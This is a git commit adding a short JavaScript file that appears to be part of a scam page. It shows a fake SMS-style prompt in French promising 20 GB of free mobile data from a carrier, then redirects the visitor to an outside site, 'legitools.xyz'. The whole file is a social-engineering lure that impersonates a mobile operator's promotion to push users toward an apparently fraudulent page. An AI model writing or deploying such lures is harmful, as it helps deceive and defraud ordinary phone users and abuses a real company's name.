694679d47ae901d3f658dfa4c7633aa1337d23af
katemj25 <mbokofficial1@gmail.com>
2025-05-18 04:48:22 -0700

    Create active-airtel-10go.js

---
+++ active-airtel-10go.js
@@ -0,0 +1,5 @@
+var password = '20 Go de données gratuites'
+password=prompt('SMS: Félicitations, votre numéro est éligible pour recevoir 20 Go de données gratuites 3G ou 4G RÉCOMPENSE POUR ANCIENNE CARTE SIM, veuillez appuyer sur OK pour ACTIVER. ','20 Go de données gratuites');
+if (password != '20 Go de données gratuites') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
